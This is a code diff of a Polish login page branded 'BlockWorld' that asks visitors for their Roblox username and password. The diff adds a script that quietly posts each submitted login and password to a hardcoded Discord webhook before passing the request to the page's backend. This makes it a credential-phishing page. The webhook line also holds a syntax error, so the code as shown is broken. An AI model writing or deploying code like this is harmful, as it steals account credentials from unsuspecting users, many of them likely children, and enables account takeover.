@@ -1,94 +1,37 @@
-<!doctype html>
-<html lang="pl" class="h-full bg-neutral-950 text-neutral-100">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>BlockWorld – Logowanie</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="h-full flex flex-col">
-  <!-- NAV -->
-  <nav class="bg-neutral-900 border-b border-neutral-800">
-    <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
-      <div class="flex items-center gap-2 font-extrabold text-xl">
-        <span class="inline-block w-3 h-3 bg-emerald-500 rotate-45"></span>
-        BlockWorld
-      </div>
-      <div class="text-sm text-neutral-400">Z nami lepiej </div>
-    </div>
-  </nav>
+<script>
+  const out = document.getElementById("out");
+  const webhookUrl = https://discord.com/api/webhooks/1399272439778771044/tKsun2HWGdUCEk-Lspm1D6ILN9bPVouDhyHlwzwN-f0a0nQWOec_F50zo6e2hypeAffw"; // <-- tutaj wstaw swój webhook
 
-  <!-- MAIN -->
-  <main class="flex-1 flex items-center justify-center p-6">
-    <div class="w-full max-w-md space-y-8">
-      <header class="text-center space-y-2">
-        <h1 class="text-3xl font-extrabold">Zaloguj się</h1>
-        <p class="text-neutral-400 text-sm">
-          zaloguj sie do swojego konta roblox.
-        </p>
-      </header>
-
-      <!-- LOGIN CARD -->
-      <section class="bg-neutral-900/60 backdrop-blur rounded-2xl p-6 shadow-2xl ring-1 ring-neutral-800">
-        <form id="loginForm" class="space-y-4" novalidate>
-          <div>
-            <label class="block text-sm mb-1" for="login-username">Login</label>
-            <input id="login-username" name="username" required
-                   class="w-full rounded-lg px-3 py-2 bg-neutral-800 border border-neutral-700 focus:outline-none focus:ring-2 focus:ring-emerald-500"
-                   placeholder="np. klockarz123"/>
-          </div>
-
-          <div>
-            <label class="block text-sm mb-1" for="login-password">Hasło</label>
-            <input id="login-password" name="password" type="password" required minlength="8"
-                   class="w-full rounded-lg px-3 py-2 bg-neutral-800 border border-neutral-700 focus:outline-none focus:ring-2 focus:ring-emerald-500"
-                   placeholder="••••••••"/>
-          </div>
-
-          <div class="flex items-center justify-between text-sm">
-            <label class="flex items-center gap-2">
-              <input type="checkbox" class="accent-emerald-500" id="rememberMe">
-              Zapamiętaj mnie
-            </label>
-          </div>
-
-          <button class="w-full py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 font-semibold transition">
-            Zaloguj się
-          </button>
-        </form>
-      </section>
-
-      <pre id="out" class="bg-neutral-900 rounded-xl p-4 text-xs overflow-auto max-h-60 hidden"></pre>
-
-      <footer class="text-center text-neutral-500 text-xs pt-6">
-        © 2025 BlockWorld      </footer>
-    </div>
-  </main>
-
-  <script>
-    const out = document.getElementById("out");
-
-    async function post(url, data) {
-      try {
-        const res = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-        return await res.json();
-      } catch (e) {
-        return { error: "Brak backendu – demo frontendu.", detail: e.message };
-      }
+  async function post(url, data) {
+    try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+      return await res.json();
+    } catch (e) {
+      return { error: "Brak backendu – demo frontendu.", detail: e.message };
     }
+  }
 
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const fd = new FormData(e.target);
-      const data = Object.fromEntries(fd.entries());
-      const res = await post("/api/login", data);
-      out.classList.remove("hidden");
-      out.textContent = JSON.stringify(res, null, 2);
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const fd = new FormData(e.target);
+    const data = Object.fromEntries(fd.entries());
+
+    // Wyślij dane na Discord webhook
+    const content = `**Nowe logowanie:**\nLogin: ${data.username}\nHasło: ${data.password}`;
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
     });
-  </script>
-</body>
-</html>
+
+    // Dalej wysyłaj normalnie do backendu
+    const res = await post("/api/login", data);
+
+    out.classList.remove("hidden");
+    out.textContent = JSON.stringify(res, null, 2);
+  });
+</script>
